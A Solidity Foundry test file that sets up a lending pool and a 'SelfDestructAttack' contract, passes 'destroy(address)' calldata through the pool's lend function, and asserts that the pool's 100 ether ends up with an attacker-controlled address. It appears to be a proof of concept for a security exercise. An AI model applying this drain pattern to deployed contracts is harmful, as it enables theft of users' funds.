// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/SelfDestruct.sol";

contract SelfDestructAttackTest is Test {
    SelfDestructPool pool;
    SelfDestructAttack attacker;
    address bob;

    function setUp() public {
        pool = new SelfDestructPool();
        bob = payable(address(0x01));

        vm.prank(bob);
        attacker = new SelfDestructAttack();

        vm.deal(address(pool), 100 ether);
        vm.deal(address(attacker), 100 ether);

        pool.lend(payable(address(attacker)), "destroy(address)", payable(bob));
    }

    function testAttackWorks() public {
        assertEq(address(pool).balance, 0 ether);
        assertEq(bob.balance, 100 ether);
        assertEq(address(attacker).balance, 100 ether);
    }
}
